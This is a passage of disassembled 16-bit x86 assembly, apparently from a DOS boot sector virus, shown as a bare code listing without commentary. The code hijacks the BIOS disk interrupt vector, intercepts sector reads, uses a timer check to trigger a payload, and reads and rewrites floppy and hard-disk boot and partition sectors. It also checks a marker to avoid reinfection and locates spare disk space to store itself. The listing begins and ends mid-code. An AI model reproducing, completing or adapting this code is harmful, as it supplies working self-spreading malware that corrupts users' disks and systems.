        db  8Eh
        db  0C8h
        push    cs
        pop ds
        call    sub_1           ; (004A)
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_1       proc    near
        xor ah,ah           ; Zero register
        int 13h         ; Disk  dl=drive a: ah=func 00h
                        ;  reset disk, al=return status
        and byte ptr ds:[7DF8h],80h ; (8F68:7DF8=0)
        mov bx,word ptr ds:[7DF9h]  ; (8F68:7DF9=0)
        push    cs
        pop ax
        sub ax,20h
        mov es,ax
        call    sub_2           ; (009D)
        mov bx,word ptr ds:[7DF9h]  ; (8F68:7DF9=0)
        inc bx
        mov ax,0FFC0h
        mov es,ax
        call    sub_2           ; (009D)
        xor ax,ax           ; Zero register
        mov byte ptr ds:[7DF7h],al  ; (8F68:7DF7=0)
        mov ds,ax
        mov ax,word ptr ds:[4Ch]    ; (0000:004C=213h)
        mov bx,word ptr ds:[4Eh]    ; (0000:004E=0E86h)
        mov word ptr ds:[4Ch],7CD0h ; (0000:004C=213h)
        mov word ptr ds:[4Eh],cs    ; (0000:004E=0E86h)
        push    cs
        pop ds
        mov word ptr ds:[7D2Ah],ax  ; (8F68:7D2A=0)
        mov word ptr ds:[7D2Ch],bx  ; (8F68:7D2C=0)
        mov dl,byte ptr ds:[7DF8h]  ; (8F68:7DF8=0)
;*      jmp far ptr loc_1       ;*(0000:7C00)
sub_1       endp
  
        db  0EAh, 0, 7Ch, 0, 0
        mov ax,301h
        jmp short loc_2     ; (00A0)
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_2       proc    near
        mov ax,201h
loc_2:
        xchg    ax,bx
        add ax,word ptr ds:[7C1Ch]  ; (8F68:7C1C=0)
        xor dx,dx           ; Zero register
        div word ptr ds:[7C18h] ; (8F68:7C18=0) ax,dxrem=dx:ax/data
        inc dl
        mov ch,dl
        xor dx,dx           ; Zero register
        div word ptr ds:[7C1Ah] ; (8F68:7C1A=0) ax,dxrem=dx:ax/data
        mov cl,6
        shl ah,cl           ; Shift w/zeros fill
        or  ah,ch
        mov cx,ax
        xchg    ch,cl
        mov dh,dl
        mov ax,bx
  
;;;;; External Entry into Subroutine ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_3:
        mov dl,byte ptr ds:[7DF8h]  ; (8F68:7DF8=0)
        mov bx,8000h
        int 13h         ; Disk  dl=drive a: ah=func 02h
                        ;  read sectors to memory es:bx
        jnc loc_3           ; Jump if carry=0
        pop ax
loc_3:
        retn
sub_2       endp
  
        push    ds
        push    es
        push    ax
        push    bx
        push    cx
        push    dx
        push    cs
        pop ds
        push    cs
        pop es
        test    byte ptr ds:[7DF7h],1   ; (8F68:7DF7=0)
        jnz loc_6           ; Jump if not zero
        cmp ah,2
        jne loc_6           ; Jump if not equal
        cmp byte ptr ds:[7DF8h],dl  ; (8F68:7DF8=0)
        mov byte ptr ds:[7DF8h],dl  ; (8F68:7DF8=0)
        jnz loc_5           ; Jump if not zero
        xor ah,ah           ; Zero register
        int 1Ah         ; Real time clock   ah=func 00h
                        ;  get system timer count cx,dx
        test    dh,7Fh
        jnz loc_4           ; Jump if not zero
        test    dl,0F0h
        jnz loc_4           ; Jump if not zero
        push    dx
;*      call    sub_5           ;*(02B3)
        db  0E8h, 0B1h, 1
        pop dx
loc_4:
        mov cx,dx
        sub dx,word ptr ds:[7EB0h]  ; (8F68:7EB0=0)
        mov word ptr ds:[7EB0h],cx  ; (8F68:7EB0=0)
        sub dx,24h
        jc  loc_6           ; Jump if carry Set
loc_5:
        or  byte ptr ds:[7DF7h],1   ; (8F68:7DF7=0)
        push    si
        push    di
        call    sub_4           ; (012E)
        pop di
        pop si
        and byte ptr ds:[7DF7h],0FEh    ; (8F68:7DF7=0)
loc_6:
        pop dx
        pop cx
        pop bx
        pop ax
        pop es
        pop ds
;*      jmp far ptr loc_15      ;*(F000:EC59)
        db  0EAh, 59h, 0ECh, 0, 0F0h
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_4       proc    near
        mov ax,201h
        mov dh,0
        mov cx,1
        call    sub_3           ; (00C3)
        test    byte ptr ds:[7DF8h],80h ; (8F68:7DF8=0)
        jz  loc_9           ; Jump if zero
        mov si,81BEh
        mov cx,4
  
locloop_7:
        cmp byte ptr [si+4],1
        je  loc_8           ; Jump if equal
        cmp byte ptr [si+4],4
        je  loc_8           ; Jump if equal
        add si,10h
        loop    locloop_7       ; Loop if cx > 0
  
        retn
loc_8:
        mov dx,[si]
        mov cx,[si+2]
        mov ax,201h
        call    sub_3           ; (00C3)
loc_9:
        mov si,8002h
        mov di,7C02h
        mov cx,1Ch
        rep movsb           ; Rep while cx>0 Mov [si] to es:[di]
        cmp word ptr ds:[81FCh],1357h   ; (8F68:81FC=0)
        jne loc_11          ; Jump if not equal
        cmp byte ptr ds:[81FBh],0   ; (8F68:81FB=0)
        jae loc_10          ; Jump if above or =
        mov ax,word ptr ds:[81F5h]  ; (8F68:81F5=0)
        mov word ptr ds:[7DF5h],ax  ; (8F68:7DF5=0)
        mov si,word ptr ds:[81F9h]  ; (8F68:81F9=0)
;*      jmp loc_14          ;*(0292)
        db  0E9h, 8, 1
loc_10:
        retn
loc_11:
        cmp word ptr ds:[800Bh],200h    ; (8F68:800B=0)
        jne loc_ret_10      ; Jump if not equal
        cmp byte ptr ds:[800Dh],2   ; (8F68:800D=0)
        jb  loc_ret_10      ; Jump if below
        mov cx,word ptr ds:[800Eh]  ; (8F68:800E=0)
        mov al,byte ptr ds:[8010h]  ; (8F68:8010=0)
        cbw             ; Convrt byte to word
        mul word ptr ds:[8016h] ; (8F68:8016=0) ax = data * ax
        add cx,ax
        mov ax,20h
        mul word ptr ds:[8011h] ; (8F68:8011=0) ax = data * ax
        add ax,1FFh
        mov bx,200h
        div bx          ; ax,dx rem=dx:ax/reg
        add cx,ax
        mov word ptr ds:[7DF5h],cx  ; (8F68:7DF5=0)
        mov ax,word ptr ds:[7C13h]  ; (8F68:7C13=0)
        sub ax,word ptr ds:[7DF5h]  ; (8F68:7DF5=0)
        mov bl,byte ptr ds:[7C0Dh]  ; (8F68:7C0D=0)
        xor dx,dx           ; Zero register
        xor bh,bh           ; Zero register
        div bx          ; ax,dx rem=dx:ax/reg
        inc ax
        mov di,ax
        and byte ptr ds:[7DF7h],0FBh    ; (8F68:7DF7=0)
        cmp ax,0FF0h
        jbe loc_12          ; Jump if below or =
        or  byte ptr ds:[7DF7h],4   ; (8F68:7DF7=0)
loc_12:
        mov si,1
        mov bx,word ptr ds:[7C0Eh]  ; (8F68:7C0E=0)
        dec bx
        mov word ptr ds:[7DF3h],bx  ; (8F68:7DF3=0)
        mov byte ptr ds:[7EB2h],0FEh    ; (8F68:7EB2=0)
;*      jmp short loc_13        ;*(0200)
sub_4       endp
  
        db  0EBh, 0Dh
        add [bx+si],ax
        or  al,0
        add [bx+si],ax
        stosb               ; Store al to es:[di]
        add al,[bx+si]
        push    di
        adc dx,[di-56h]
  
